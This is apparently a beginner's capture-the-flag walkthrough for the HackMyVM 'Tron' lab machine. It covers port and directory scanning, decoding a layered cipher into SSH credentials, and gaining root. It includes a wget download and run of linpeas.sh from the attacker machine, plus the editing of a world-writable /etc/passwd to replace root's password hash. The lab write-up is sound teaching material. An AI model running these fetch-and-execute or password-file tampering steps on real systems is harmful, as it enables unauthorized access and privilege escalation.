@@ -1,0 +1,401 @@
+----------HackMyVM----------
+   -----TRON Writeup-----
+
+--> Tron is a easy machine on HackMyVM it is good for begginer whom wants to test themselvs about different and basic topics. 
+
+--> Before we begin we need to see our IP adress with ifconfig command.
+
+--> netdiscover
+   -We use netdiscover to scan the IP adress of the target machine and we got (10.0.2.26)
+   this is for my vitural machine yours will be different. 
+
+
+-->nmap 
+   -We use nmap for further scanning.
+(root㉿kali)-[*]
+└─# nmap -sV -sC -A 10.0.2.26
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-01 13:30 EDT
+Nmap scan report for 10.0.2.26
+Host is up (0.00063s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 1f:ed:64:93:84:b5:b2:e8:af:5a:0e:6f:52:af:4b:48 (RSA)
+|   256 3d:df:6f:02:13:9e:15:f8:51:94:30:f8:45:e3:f2:93 (ECDSA)
+|_  256 2f:f4:af:e1:f4:c4:a5:3b:50:bb:e5:b9:2a:9f:39:de (ED25519)
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Master Control Program
+MAC Address: 08:00:27:CB:B7:E8 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.63 ms 10.0.2.26
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.40 seconds
+
+
+-->Checking the (http://10.0.2.26) for further inspection of the web page.
+(root㉿kali)-[*]
+└─# curl http://10.0.2.26
+<!DOCTYPE html>
+<!-- kzhh:SbWP9q94ZtE9qD  -->
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <link href="style.css" rel="stylesheet">
+        <title>Master Control Program</title>
+    </head>
+
+    <body> 
+        <h1 class="neon" data-text="Tron">Tron</h1>
+    </body> 
+</html>           
+
+-->We found Encryption in the command line 
+    <!-- kzhh:SbWP9q94ZtE9qD  -->
+   - Let's note it down for now we will turn back to this Encryption.
+   - Now let's download the image to check weather there is some messages inside it.
+
+
+-->exiftool
+   -We are gonna use exiftool for checking the image in the webpage 
+(root㉿kali)-[*]
+└─# exiftool tron.jpg 
+ExifTool Version Number         : 12.76
+File Name                       : tron.jpg
+Directory                       : .
+File Size                       : 350 kB
+File Modification Date/Time     : 2024:05:01 13:32:05-04:00
+File Access Date/Time           : 2024:05:01 13:32:05-04:00
+File Inode Change Date/Time     : 2024:05:01 13:32:05-04:00
+File Permissions                : -rw-r--r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+Exif Byte Order                 : Big-endian (Motorola, MM)
+Photometric Interpretation      : RGB
+Orientation                     : Horizontal (normal)
+Samples Per Pixel               : 3
+X Resolution                    : 72
+Y Resolution                    : 72
+Resolution Unit                 : inches
+Software                        : Adobe Photoshop CC (Windows)
+Modify Date                     : 2014:04:26 22:52:41
+Exif Version                    : 0221
+Color Space                     : sRGB
+Exif Image Width                : 1920
+Exif Image Height               : 1080
+Compression                     : JPEG (old-style)
+Thumbnail Offset                : 394
+Thumbnail Length                : 1778
+Current IPTC Digest             : 895830b84860ec5b4969115ffe7abc74
+Coded Character Set             : UTF8
+Application Record Version      : 26109
+IPTC Digest                     : 895830b84860ec5b4969115ffe7abc74
+Displayed Units X               : inches
+Displayed Units Y               : inches
+Print Style                     : Centered
+Print Position                  : 0 0
+Print Scale                     : 1
+Global Angle                    : 120
+Global Altitude                 : 30
+Copyright Flag                  : False
+URL List                        : 
+Slices Group Name               : tron-legacy-original-vertical-digital-citizen-254240
+Num Slices                      : 1
+Pixel Aspect Ratio              : 1
+Photoshop Thumbnail             : (Binary data 1778 bytes, use -b option to extract)
+Has Real Merged Data            : Yes
+Writer Name                     : Adobe Photoshop
+Reader Name                     : Adobe Photoshop CC
+Photoshop Quality               : 12
+Photoshop Format                : Standard
+XMP Toolkit                     : Adobe XMP Core 5.5-c014 79.151481, 2013/03/13-12:09:15
+Format                          : image/jpeg
+Create Date                     : 2010:12:14 18:21:05-04:00
+Metadata Date                   : 2014:04:26 22:52:41-05:00
+Creator Tool                    : Adobe Photoshop CS3 Windows
+Document ID                     : uuid:193EE25BD007E0118236D852DE6B2CF6
+Instance ID                     : xmp.iid:71249607-3936-f843-87a1-32229cd49e90
+Original Document ID            : uuid:193EE25BD007E0118236D852DE6B2CF6
+Legacy IPTC Digest              : 94AB9765DE2996CA16F7407BA4B4AAD3
+Color Mode                      : RGB
+ICC Profile Name                : sRGB IEC61966-2.1
+Marked                          : False
+Derived From Instance ID        : uuid:A26C19C6CE07E0118236D852DE6B2CF6
+Derived From Document ID        : uuid:6C22C341A8EADE11A34EB7AFB84541E5
+History Action                  : saved
+History Instance ID             : xmp.iid:71249607-3936-f843-87a1-32229cd49e90
+History When                    : 2014:04:26 22:52:41-05:00
+History Software Agent          : Adobe Photoshop CC (Windows)
+History Changed                 : /
+Profile CMM Type                : Linotronic
+Profile Version                 : 2.1.0
+Profile Class                   : Display Device Profile
+Color Space Data                : RGB
+Profile Connection Space        : XYZ
+Profile Date Time               : 1998:02:09 06:49:00
+Profile File Signature          : acsp
+Primary Platform                : Microsoft Corporation
+CMM Flags                       : Not Embedded, Independent
+Device Manufacturer             : Hewlett-Packard
+Device Model                    : sRGB
+Device Attributes               : Reflective, Glossy, Positive, Color
+Rendering Intent                : Media-Relative Colorimetric
+Connection Space Illuminant     : 0.9642 1 0.82491
+Profile Creator                 : Hewlett-Packard
+Profile ID                      : 0
+Profile Copyright               : Copyright (c) 1998 Hewlett-Packard Company
+Profile Description             : sRGB IEC61966-2.1
+Media White Point               : 0.95045 1 1.08905
+Media Black Point               : 0 0 0
+Red Matrix Column               : 0.43607 0.22249 0.01392
+Green Matrix Column             : 0.38515 0.71687 0.09708
+Blue Matrix Column              : 0.14307 0.06061 0.7141
+Device Mfg Desc                 : IEC http://www.iec.ch
+Device Model Desc               : IEC 61966-2.1 Default RGB colour space - sRGB
+Viewing Cond Desc               : Reference Viewing Condition in IEC61966-2.1
+Viewing Cond Illuminant         : 19.6445 20.3718 16.8089
+Viewing Cond Surround           : 3.92889 4.07439 3.36179
+Viewing Cond Illuminant Type    : D50
+Luminance                       : 76.03647 80 87.12462
+Measurement Observer            : CIE 1931
+Measurement Backing             : 0 0 0
+Measurement Geometry            : Unknown
+Measurement Flare               : 0.999%
+Measurement Illuminant          : D65
+Technology                      : Cathode Ray Tube Display
+Red Tone Reproduction Curve     : (Binary data 2060 bytes, use -b option to extract)
+Green Tone Reproduction Curve   : (Binary data 2060 bytes, use -b option to extract)
+Blue Tone Reproduction Curve    : (Binary data 2060 bytes, use -b option to extract)
+DCT Encode Version              : 100
+APP14 Flags 0                   : [14]
+APP14 Flags 1                   : (none)
+Color Transform                 : YCbCr
+Image Width                     : 1920
+Image Height                    : 1080
+Encoding Process                : Baseline DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
+Image Size                      : 1920x1080
+Megapixels                      : 2.1
+Thumbnail Image                 : (Binary data 1778 bytes, use -b option to extract)
+
+   -Dead end.
+
+
+
+-->gobuster
+─(root㉿kali)-[*]
+└─# gobuster dir -u http://10.0.2.26 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x html,php,css,txt,jpeg   
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.0.2.26
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              jpeg,html,php,css,txt
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.html                (Status: 403) [Size: 274]
+/index.html           (Status: 200) [Size: 309]
+/img                  (Status: 301) [Size: 304] [--> http://10.0.2.26/img/]
+/manual               (Status: 301) [Size: 307] [--> http://10.0.2.26/manual/]
+/style.css            (Status: 200) [Size: 921]
+/robots.txt           (Status: 200) [Size: 623]
+/font                 (Status: 301) [Size: 305] [--> http://10.0.2.26/font/]
+/.html                (Status: 403) [Size: 274]
+/MCP                  (Status: 301) [Size: 304] [--> http://10.0.2.26/MCP/]
+Progress: 465121 / 1323366 (35.15%)^C
+[!] Keyboard interrupt detected, terminating.
+Progress: 466060 / 1323366 (35.22%)
+===============================================================
+Finished
+===============================================================
+
+   -In gobuster scan we see that there is a file called MCP, font and img
+   lets check those.
+   -In http://10.0.2.26/img there is the orriginal Image that we checked earlier.
+   -Now lets check http://10.0.2.26/font in this location we found TRON.TTF I used online converter to 
+   check what is inside and Isaw this.
+   A quick brown fox jumps over the lazy dog. --> I this this is a dead end too.
+   -Finally ı moved http://10.0.2.26/MCP in there ı saw a terminalserver directory and tron.txt
+      -In tron.txt 
+      MASTER CONTROL PROGRAM
+----------------------
+
+Ram:
+Do you believe in the Users?
+
+Crom:
+Sure I do! If I didn't have a User, than who wrote me? 
+
+
+KysrKysrKysrK1s+Kz4rKys+KysrKysrKz4rKysrKysrKysrPDw8PC1dPj4+PisrKysrKysrKysrKy4tLS0tLi0tLS0tLS0tLS0tLisrKysrKysrKysrKysrKysrKysrKysrKy4tLS0tLS0tLS0tLS0tLS0tLS0tLS4rKysrKysrKysrKysrLg==
+      -It is a base64 Encryption let's try to decrypt it.
+      ++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>++++++++++++.----.-----------.++++++++++++++++++++++++.--------------------.+++++++++++++.
+      -First decyption gave me this and a little bit of search ı learnd that this is an another                Encryption method called Brainfuck when I decrypt it ı got this.
+         player 
+       -This might be a user lets save it for later. 
+       -In http://10.0.2.26/MCP/terminalserver/30513.txt I saw this text.
+       substitute
+--------------------------
+plaintext
+abcdefghijklmnopqrstuvwxyz
+
+ciphertext
+zyxwvutsrqponmlkjihgfedcba
+--------------------------
+      -Then I went Cyber Chef to decrypt the encryption that we found earlier. It is a Substitute
+      kzhh:SbWP9q94ZtE9qD --> pass:*************
+      -These are the username and the password for the machine we can use ssh port to enter the                computer.
+
+
+-->ssh login and further inspection
+  ─(root㉿kali)-[*]
+└─# ssh player@10.0.2.26 
+The authenticity of host '10.0.2.26 (10.0.2.26)' can't be established.
+ED25519 key fingerprint is SHA256:5Aqwhpea10wZ1ImqTcTR+3yd4M953KwK0WEA3U17OFw.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes 
+Warning: Permanently added '10.0.2.26' (ED25519) to the list of known hosts.
+player@10.0.2.26's password: 
+Linux tron 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+  player@tron:~$ whoami;id;hostname
+player
+uid=1000(player) gid=1000(player) groups=1000(player),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
+tron
+   player@tron:~$ ls -la 
+total 32
+drwxr-xr-x 3 player player 4096 May  1  2021 .
+drwxr-xr-x 3 root   root   4096 Apr 24  2021 ..
+-rw------- 1 player player    2 May  2  2021 .bash_history
+-rw-r--r-- 1 player player  220 Apr 24  2021 .bash_logout
+-rw-r--r-- 1 player player 3526 Apr 24  2021 .bashrc
+drwxr-xr-x 3 player player 4096 Apr 26  2021 .local
+-rw-r--r-- 1 player player  807 Apr 24  2021 .profile
+-rw-r--r-- 1 root   root     19 May  1  2021 user.txt
+   player@tron:~$ cat user.txt
+************************* -->You got your user flag congrats...
+   player@tron:~$ sudo -l
+[sudo] password for player: 
+Sorry, user player may not run sudo on tron.
+player@tron:~$ find / -perm -u=s 2>/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/gpasswd
+/usr/bin/su
+/usr/bin/sudo
+/usr/bin/umount
+/usr/bin/newgrp
+   -We cant use sudo -l that is why we write --> find / -perm -u=s 2>/dev/null
+
+
+
+-->Linpeas.sh
+   -lets upload linpeas.sh to see further more.
+      -From Kali
+      ┌──(root㉿kali)-[*]
+      └─# python3 -m http.server     
+      Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+      10.0.2.26 - - [01/May/2024 14:16:40] "GET /linpeas.sh HTTP/1.1" 200 -
+      
+      -From Target machine 
+   player@tron:/$ cd tmp
+   player@tron:/tmp$ ls 
+      systemd-private-da41c5afa65740d6b6f9af5201de3114-apache2.service-wRFrl5
+      systemd-private-da41c5afa65740d6b6f9af5201de3114-systemd-timesyncd.service-itE6XL
+   player@tron:/tmp$ wget http://10.0.2.24:8000/linpeas.sh
+      --2024-05-01 14:20:03--  http://10.0.2.24:8000/linpeas.sh
+      Connecting to 10.0.2.24:8000... connected.
+      HTTP request sent, awaiting response... 200 OK
+      Length: 332111 (324K) [text/x-sh]
+      Saving to: ‘linpeas.sh’
+
+      linpeas.sh                     100%[===================================================>] 324.33K        --.-KB/s    in 0.009s  
+
+      2024-05-01 14:20:03 (36.2 MB/s) - ‘linpeas.sh’ saved [332111/332111]
+   player@tron:/tmp$ chmod +x linpeas.sh
+   player@tron:/tmp$ ./linpeas.sh
+
+
+                     ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+             ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄▄
+      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄
+  ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄
+  ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
+  ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
+  ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
+  ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
+  ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
+  ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
+  ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
+  ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
+  ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
+  ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
+   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+   ▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄
+        ▄▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄ 
+             ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+    linpeas v3.1.5 - Safe OSCP by carlospolop
+
+   ADVISORY: This script should be used for authorized penetration testing and/or educational purposes    only. Any misuse of this software will not be the responsibility of the author or of any other          collaborator. Use it at your own networks and/or with the network owner's permission.
+
+
+-->Privilage Esc.
+player@tron:/tmp$ ls -al /etc/passwd
+   -rw-r--rw- 1 root root 1399 May  1  2021 /etc/passwd
+player@tron:/tmp$ openssl passwd
+   Password: 
+   Verifying - Password: 
+   PJP6fi5Mt6P4Q
+player@tron:/tmp$ nano /etc/passwd --> We paste PJP6fi5Mt6P4Q with x in root::x::0:0 part
+player@tron:/tmp$ su root
+root@tron:~# whoami;id;hostname
+   root
+   uid=0(root) gid=0(root) groups=0(root)
+   tron
+root@tron:/# cd root 
+root@tron:~# ls 
+   root.txt
+root@tron:~# cat root.txt
+   ***************************** --> Congrats this is your root flag.
+
+
+
+
+
+
